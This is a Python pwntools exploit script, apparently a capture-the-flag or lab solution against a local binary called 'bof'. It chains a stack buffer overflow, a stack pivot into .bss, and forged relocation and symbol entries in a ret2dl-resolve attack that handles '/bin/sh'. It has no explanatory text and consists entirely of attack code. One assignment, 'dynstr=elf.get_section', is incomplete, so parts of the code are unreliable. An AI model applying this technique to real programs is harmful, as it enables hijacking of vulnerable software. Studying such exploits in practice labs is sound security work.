from pwn import *

elf = ELF('bof')
r=process('./bof')
rop=ROP('./bof')

offset=112
bss_addr=elf.bss()

stack_size=0x800
base_stage=bss_addr+stack_size

rop.raw('a'*offset)
rop.read(0,base_stage,100)
rop.migrate(base_stage)
r.sendline(rop.chain())

rop=ROP('./bof')
sh="/bin/sh"
dynsym=elf.get_section_by_name('.dynsym').header.sh_addr
dynstr=elf.get_section
plt0=elf.get_section_by_name('.plt').header.sh_addr
rel_plt=elf.get_section_by_name('.rel.plt').header.sh_addr
index_offset=base_stage+24-rel_plt
write_got=elf.got['write']
fake_sym_addr=base_stage+32

align=0x10-((fake_sym_addr-dynsym)&0xf)
fake_sym_addr=fake_sym_addr+align
index_dynsym=(fake_sym_addr-dynsym)/0x10
fake_write_sym=flat([0x4c,0,0,0x12])

r_info=(index_dynsym<<8)| 0x7
fake_write_reloc=flat([write_got,r_info])


rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage+80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)
rop.raw('a'*align)
rop.raw(fake_write_sym)
rop.raw('a'*(80-len(rop.chain())))

rop.raw(sh)
rop.raw('a'*(100-len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
